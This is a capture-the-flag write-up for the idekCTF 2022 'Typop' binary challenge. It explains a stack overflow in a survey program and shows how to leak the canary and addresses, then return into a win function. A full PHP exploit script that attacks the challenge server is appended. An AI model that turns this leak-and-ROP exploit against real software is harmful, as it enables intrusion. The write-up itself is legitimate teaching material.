# Typop - idekCTF 2022 (pwn, 155 solved, 408p)

## Introduction
Typop is a pwn task.

An archive containing a binary and a Dockerfile is given.

## Reverse engineering
The binary asks the user if they want to fill a survey.

If they accept, the binary takes feedback from the user, and then it asks if the
user wishes to complete an other survey.

```c
while(true) {
	puts("Do you want to complete a survey?");

	if('y' != getchar())
		break;

	getchar();
	getFeedback();
}
```

When asking for a feedback, the binary asks if the user likes CTF, and then asks
for additional information.

```c
char buffer[10];

puts("Do you like ctf?");
read(STDIN_FILENO, buffer, 30);
printf("You said: %s\n", buffer);

if('y' == buffer[0])
	printf("That's great ! ");
else
	printf("Aww :( ");

puts("Can you provide some extra feedback?");
read(STDIN_FILENO, buffer, 90);
```

There is also a function called `win` that never gets called. This function
opens a file and read it.

## Vulnerabilities
The function that reads feedbacks will 30 bytes, then 90 bytes in a buffer of
size 10. It is possible to overwrite data on the stack, including the return
address.

The buffer is printed back to the user, this can be used to leak values on the
stack.

## Exploitation
Since the `getFeedback` function reads twice, it is possible to read values from
the stack. This can be done by using the first call to `read` to fill the buffer
with padding bytes, and using the second call to `read` to fix the values
smashed by the first call.

Using this technique it is possible to leak the stack canary, the saved `rbp`
register, and the saved `rip` register. This effectively leaks the addresses of
the program's stack and program's base.

It is then possible to smash the stack and put a ROP chain that would call the
`win` function, right before the call to `fopen` to open an arbitrary file and
print it.

```
000012ac  LEA  RAX=>local_52, [RBP + -0x4a]
000012b0  LEA  RSI, [DAT_00002008] = 72h    r
000012b7  MOV  RDI, RAX
000012ba  CALL <EXTERNAL>::fopen
```

**Flag**: `idek{2_guess_typos_do_matter}`

## Appendices
### pwn.php
```php
#!/usr/bin/php
<?php // vim: filetype=php
const LOCAL = false;
const HOST  = "typop.chal.idek.team";
const PORT  = 1337;

function expect_check(string $left, string $right)
{
	if($left !== $right) {
		fprintf(STDERR, "Wanted: %s\n", $left);
		fprintf(STDERR, "Got:    %s\n", $right);
		throw new Exception("Unexpected data");
	}
}

function expect($fp, string $str)
{
	$data = fread($fp, strlen($str));
	expect_check($str, $data);
}

function expectLine($fp, string $line)
{
	$data = fgets($fp);
	expect_check("$line\n", $data);
}

function line($fp) : string
{
	$line = fgets($fp);

	if("\n" !== substr($line, -1))
		throw new Exception("fgets did not return a line");

	return substr($line, 0, -1);
}

function survey($fp, string $payload, bool $s = true) : string
{
	if($s) {
		expectLine($fp, "Do you want to complete a survey?");
		fwrite($fp, "y\n");
	}

	expectLine($fp, "Do you like ctf?");
	fwrite($fp, $payload);

	expect($fp, "You said: $payload");
	return line($fp);
}

function extra($fp, string $payload)
{
	expect($fp, "That's great! ");
	expectLine($fp, "Can you provide some extra feedback?");
	fwrite($fp, $payload);
}

printf("[*] Opening connection\n");
$time = microtime(true);

$fp = fsockopen(HOST, PORT);

if(!LOCAL)
	expectLine($fp, "== proof-of-work: disabled ==");

printf("[+] Done in %f seconds\n", microtime(true) - $time);
printf("\n");

$leak   = survey($fp, str_repeat("y", 10 + 1));
$canary = "\x00" . substr($leak, 0, 7);
$leak   = substr($leak, 7);
$rbp    = unpack("P", str_pad($leak, 8, "\x00"))[1];

$payload = str_repeat("x", 10) . $canary . pack("P", $rbp);
extra($fp, $payload);


$leak = survey($fp, str_repeat("y", 10 + 16));
$base = unpack("P", str_pad($leak, 8, "\x00"))[1] - 0x1447;

extra($fp, $payload);

printf("[+] Base = %X\n", $base);
if(LOCAL && 0 === $base)
	$base = 1 << 32;


$rbp += 0x28 + 10 + 8 * 3;
$payload = str_pad("TFNS", 10, "\x00") . $canary . pack("P*", $rbp,
	$base + 0x000012ac,
) . "./flag.txt\0";

survey($fp, "y");
extra($fp, $payload);

while($buffer = fread($fp, 4096))
	echo $buffer;
```
